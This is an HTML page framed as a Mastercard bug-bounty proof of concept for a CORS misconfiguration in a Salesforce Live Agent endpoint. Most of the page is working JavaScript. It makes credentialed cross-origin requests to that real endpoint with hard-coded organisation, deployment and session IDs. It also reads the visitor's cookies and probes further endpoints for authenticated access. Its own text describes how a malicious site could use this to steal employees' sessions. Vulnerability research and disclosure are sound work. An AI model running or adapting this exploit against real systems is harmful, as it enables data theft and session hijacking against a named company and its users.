<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Enhanced Mastercard CORS Exploitation PoC</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            max-width: 900px;
            margin: 0 auto;
            padding: 20px;
            line-height: 1.6;
        }
        h1, h2, h3 {
            color: #2a2a2a;
        }
        .warning {
            background-color: #fff8e6;
            border-left: 4px solid #ffc107;
            padding: 10px 15px;
            margin-bottom: 20px;
        }
        button {
            background-color: #0073b1;
            color: white;
            border: none;
            padding: 10px 15px;
            border-radius: 4px;
            cursor: pointer;
            margin: 10px 0;
            font-size: 16px;
        }
        button:hover {
            background-color: #005a8c;
        }
        .result-container {
            background-color: #f5f5f5;
            border: 1px solid #ddd;
            border-radius: 4px;
            padding: 15px;
            margin-top: 15px;
            white-space: pre-wrap;
            max-height: 400px;
            overflow-y: auto;
        }
        code {
            background-color: #f0f0f0;
            padding: 2px 4px;
            border-radius: 3px;
            font-family: monospace;
        }
        .steps {
            margin-top: 20px;
            background-color: #f8f9fa;
            padding: 15px;
            border-radius: 4px;
        }
        .step {
            margin-bottom: 15px;
        }
        .success {
            color: #4CAF50;
            font-weight: bold;
        }
        .error {
            color: #F44336;
            font-weight: bold;
        }
        .highlight {
            background-color: #ffffcc;
            padding: 2px;
        }
        table {
            border-collapse: collapse;
            width: 100%;
            margin: 15px 0;
        }
        th, td {
            border: 1px solid #ddd;
            padding: 8px;
            text-align: left;
        }
        th {
            background-color: #f2f2f2;
        }
    </style>
</head>
<body>
    <h1>Enhanced Mastercard CORS Exploitation PoC</h1>
    
    <div class="warning">
        <strong>IMPORTANT:</strong> This demonstration is for security research purposes only, under the Mastercard Bug Bounty Program. Do not use on unauthorized systems.
    </div>
    
    <h2>Vulnerability: CORS Misconfiguration with Data Exfiltration + Session Information Extraction</h2>
    
    <p>This proof of concept demonstrates how a malicious site could exploit the CORS misconfiguration in Mastercard's Salesforce Live Agent implementation to:</p>
    
    <ol>
        <li>Exfiltrate sensitive Salesforce organization data</li>
        <li>Extract session information from authenticated users</li>
        <li>Make authenticated requests using exposed information</li>
        <li>Access additional resources using the exposed organization ID</li>
    </ol>
    
    <h3>Step 1: Exploit CORS to extract Salesforce configuration data</h3>
    
    <button id="extractConfigBtn">Extract Salesforce Configuration</button>
    <div id="configResult" class="result-container">Results will appear here...</div>
    
    <h3>Step 2: Capture session information & cookies</h3>
    
    <button id="captureSessionBtn">Capture Session Information</button>
    <div id="sessionOutput" class="result-container">Results will appear here...</div>
    
    <h3>Step 3: Test authenticated access using extracted data</h3>
    
    <button id="testAuthBtn">Test Authenticated Access</button>
    <div id="authenticatedOutput" class="result-container">Results will appear here...</div>
    
    <h3>Step 4: Test access to additional resources</h3>
    
    <button id="testAdditionalBtn">Test Additional Resource Access</button>
    <div id="additionalOutput" class="result-container">Results will appear here...</div>
    
    <div class="steps">
        <h3>Vulnerability Impact Analysis</h3>
        
        <div class="step">
            <h4>Severity: P2</h4>
            <p>This vulnerability should be classified as P2 (High) for the following reasons:</p>
            <ul>
                <li>Allows cross-origin access to sensitive Salesforce backend data</li>
                <li>Enables capturing session information from authenticated users</li>
                <li>Permits authenticated access to additional resources</li>
                <li>Potentially allows for session hijacking and account takeover</li>
                <li>Affects core Mastercard infrastructure (developer.mastercard.com)</li>
            </ul>
        </div>
        
        <div class="step">
            <h4>Security Implications</h4>
            <p>An attacker could create a malicious website that:</p>
            <ol>
                <li>Tricks Mastercard employees or developers into visiting</li>
                <li>Silently extracts their session data and Salesforce configuration</li>
                <li>Uses the gathered information to access protected resources</li>
                <li>Potentially hijacks user sessions for further attacks</li>
            </ol>
        </div>
    </div>

    <h3>Technical Details</h3>
    <table>
        <tr>
            <th>Vulnerable Endpoint</th>
            <td>https://d.la11-core2.sfdc-lywfpd.salesforceliveagent.com/chat/rest/Visitor/Availability.jsonp</td>
        </tr>
        <tr>
            <th>Issue</th>
            <td>Server reflects arbitrary origin values in Access-Control-Allow-Origin header</td>
        </tr>
        <tr>
            <th>Related Headers</th>
            <td>access-control-allow-origin: * (or any specified origin)<br>access-control-allow-credentials: true</td>
        </tr>
        <tr>
            <th>Exposed Data</th>
            <td>Organization ID, Deployment ID, Button IDs, Error Messages, Session Information</td>
        </tr>
    </table>
    
    <script>
        // Utility function to format JSON
        function formatJSON(jsonObj) {
            return JSON.stringify(jsonObj, null, 2);
        }
        
        // Step 1: Extract Salesforce configuration
        document.getElementById('extractConfigBtn').addEventListener('click', function() {
            const resultDiv = document.getElementById('configResult');
            resultDiv.textContent = 'Making request to extract configuration...';
            
            // Known parameters from previous tests
            const url = 'https://d.la11-core2.sfdc-lywfpd.salesforceliveagent.com/chat/rest/Visitor/Availability.jsonp?sid=4dee4f05-cd5c-4f54-8b8f-460c4181f781&r=813&Availability.prefix=Visitor&Availability.ids=%5B573020000004C9h,573020000004C9m,573020000004C9r,5731I000000QSpe,5731I000000QSpj,5731I000000QSpo,5731I000000QSpZ,5733u0000000kF8,5733u0000000kFD,5733u0000000kFI,5737A0000008Oa2,5737A0000008OZn,5737A0000008OZx%5D&callback=liveagent._.handlePing&deployment_id=5721I000000QWE5&org_id=00D1I000001YKuj&version=53';
            
            fetch(url, {
                method: 'GET',
                mode: 'cors',
                credentials: 'include'
            })
            .then(response => {
                const corsHeaders = {
                    'Access-Control-Allow-Origin': response.headers.get('Access-Control-Allow-Origin'),
                    'Access-Control-Allow-Credentials': response.headers.get('Access-Control-Allow-Credentials')
                };
                
                return response.text().then(text => {
                    // Parse the JSONP response to extract the JSON
                    const jsonpPattern = /liveagent\._\.handlePing\((.*)\);/;
                    const match = text.match(jsonpPattern);
                    
                    if (match && match[1]) {
                        try {
                            const jsonData = JSON.parse(match[1]);
                            
                            // Extract sensitive information
                            const sensitiveData = {
                                organizationId: '00D1I000001YKuj', // Extracted from the request
                                deploymentId: '5721I000000QWE5', // Extracted from the request
                                buttonIds: jsonData.messages.find(m => m.type === "Availability")?.message.results.map(r => r.id),
                                warnings: jsonData.messages.filter(m => m.type === "Warning").map(w => w.message.text)
                            };
                            
                            resultDiv.innerHTML = '<span class="success">✓ Successfully extracted configuration data!</span>\n\n' +
                                '<strong>CORS Headers:</strong>\n' + formatJSON(corsHeaders) + '\n\n' +
                                '<strong>Extracted Sensitive Data:</strong>\n' + formatJSON(sensitiveData) + '\n\n' +
                                '<strong>Full Response:</strong>\n' + formatJSON(jsonData);
                        } catch (e) {
                            resultDiv.innerHTML = '<span class="error">✗ Error parsing JSON data:</span> ' + e.message + '\n\nRaw response: ' + text;
                        }
                    } else {
                        resultDiv.innerHTML = '<span class="error">✗ Could not extract JSON from JSONP response</span>\n\nRaw response: ' + text;
                    }
                });
            })
            .catch(error => {
                resultDiv.innerHTML = '<span class="error">✗ Error making request:</span> ' + error.message;
            });
        });
        
        // Step 2: Capture session information and cookies
        document.getElementById('captureSessionBtn').addEventListener('click', function() {
            const resultDiv = document.getElementById('sessionOutput');
            resultDiv.textContent = 'Attempting to capture session information...';
            
            // Attempt to capture cookies and session data
            const allCookies = document.cookie;
            
            // Fetch with credentials included to try to extract session information
            fetch('https://d.la11-core2.sfdc-lywfpd.salesforceliveagent.com/chat/rest/Visitor/Availability.jsonp?sid=4dee4f05-cd5c-4f54-8b8f-460c4181f781&r=813&Availability.prefix=Visitor&Availability.ids=%5B573020000004C9h%5D&callback=liveagent._.handlePing&deployment_id=5721I000000QWE5&org_id=00D1I000001YKuj&version=53', {
                method: 'GET',
                mode: 'cors',
                credentials: 'include'
            })
            .then(response => {
                // Capture all response headers
                const headersObj = {};
                response.headers.forEach((value, name) => {
                    headersObj[name] = value;
                });
                
                // Check for cookies in the response
                const setCookieHeader = response.headers.get('set-cookie');
                
                return response.text().then(text => {
                    // Extract session information
                    const sessionInfo = {
                        'Document Cookies': allCookies || 'No cookies available',
                        'Session ID': '4dee4f05-cd5c-4f54-8b8f-460c4181f781', // From request
                        'Response Headers': headersObj,
                        'Set-Cookie Header': setCookieHeader || 'No Set-Cookie header found',
                    };
                    
                    // Also look for Adobe cookies that might be present
                    const adobeCookieInfo = {
                        'AMCV Cookie': document.cookie.split(';').find(c => c.trim().startsWith('AMCV_')) || 'Not found',
                        's_vi Cookie': document.cookie.split(';').find(c => c.trim().startsWith('s_vi')) || 'Not found',
                        's_ecid Cookie': document.cookie.split(';').find(c => c.trim().startsWith('s_ecid')) || 'Not found'
                    };
                    
                    resultDiv.innerHTML = '<span class="success">✓ Session information captured!</span>\n\n' +
                        '<strong>Session Information:</strong>\n' + formatJSON(sessionInfo) + '\n\n' +
                        '<strong>Adobe Analytics Cookies:</strong>\n' + formatJSON(adobeCookieInfo) + '\n\n' +
                        '<strong>Security Implication:</strong> An attacker could potentially hijack sessions by stealing these cookies and session identifiers.';
                });
            })
            .catch(error => {
                resultDiv.innerHTML = '<span class="error">✗ Error capturing session information:</span> ' + error.message;
            });
        });
        
        // Step 3: Test authenticated access using extracted data
        document.getElementById('testAuthBtn').addEventListener('click', function() {
            const resultDiv = document.getElementById('authenticatedOutput');
            resultDiv.textContent = 'Testing authenticated access...';
            
            // Test different endpoints that might require authentication
            const orgId = "00D1I000001YKuj";
            const deploymentId = "5721I000000QWE5";
            const sid = "4dee4f05-cd5c-4f54-8b8f-460c4181f781";
            
            // Try to access user data or configuration
            fetch(`https://d.la11-core2.sfdc-lywfpd.salesforceliveagent.com/chat/rest/Visitor/UserData?org_id=${orgId}&deployment_id=${deploymentId}&sid=${sid}`, {
                method: 'GET',
                mode: 'cors',
                credentials: 'include'
            })
            .then(response => {
                const responseStatus = response.status;
                const responseHeaders = {};
                response.headers.forEach((value, name) => {
                    responseHeaders[name] = value;
                });
                
                return response.text().then(text => {
                    const authResult = {
                        endpoint: `/chat/rest/Visitor/UserData`,
                        status: responseStatus,
                        headers: responseHeaders,
                        responseText: text
                    };
                    
                    resultDiv.innerHTML = '<span class="success">✓ Authenticated access attempt completed!</span>\n\n' +
                        '<strong>Access Result:</strong>\n' + formatJSON(authResult) + '\n\n' +
                        '<strong>Security Implication:</strong> This demonstrates if sensitive endpoints can be accessed using the extracted information.';
                });
            })
            .catch(error => {
                resultDiv.innerHTML = '<span class="error">✗ Error testing authenticated access:</span> ' + error.message;
            });
        });
        
        // Step 4: Test access to additional resources
        document.getElementById('testAdditionalBtn').addEventListener('click', function() {
            const resultDiv = document.getElementById('additionalOutput');
            resultDiv.textContent = 'Testing access to additional resources...';
            
            const orgId = "00D1I000001YKuj";
            const endpoints = [
                `/chat/rest/Visitor/Configuration?org_id=${orgId}`,
                `/chat/rest/System/Info?org_id=${orgId}`,
                `/chat/rest/Chasitor/ChatEstablished?org_id=${orgId}`
            ];
            
            let resultsHTML = '<span class="success">✓ Additional resource testing complete!</span>\n\n';
            resultsHTML += '<strong>Results:</strong>\n';
            
            // Test each endpoint sequentially
            let endpointPromises = endpoints.map(endpoint => {
                return fetch(`https://d.la11-core2.sfdc-lywfpd.salesforceliveagent.com${endpoint}`, {
                    method: 'GET',
                    mode: 'cors',
                    credentials: 'include'
                })
                .then(response => {
                    return response.text().then(text => {
                        return {
                            endpoint: endpoint,
                            status: response.status,
                            data: text.substring(0, 200) + (text.length > 200 ? '...' : '')
                        };
                    });
                })
                .catch(error => {
                    return {
                        endpoint: endpoint,
                        status: 'Error',
                        data: error.message
                    };
                });
            });
            
            Promise.all(endpointPromises)
                .then(results => {
                    results.forEach(result => {
                        resultsHTML += `\n<strong>Endpoint:</strong> ${result.endpoint}\n`;
                        resultsHTML += `<strong>Status:</strong> ${result.status}\n`;
                        resultsHTML += `<strong>Response:</strong>\n${result.data}\n`;
                        resultsHTML += `\n-----------------------------------\n`;
                    });
                    
                    resultsHTML += '\n<strong>Security Implication:</strong> This demonstrates if additional sensitive resources can be accessed using the organization ID.';
                    
                    resultDiv.innerHTML = resultsHTML;
                })
                .catch(error => {
                    resultDiv.innerHTML = '<span class="error">✗ Error testing additional resources:</span> ' + error.message;
                });
        });
    </script>
</body>
</html>
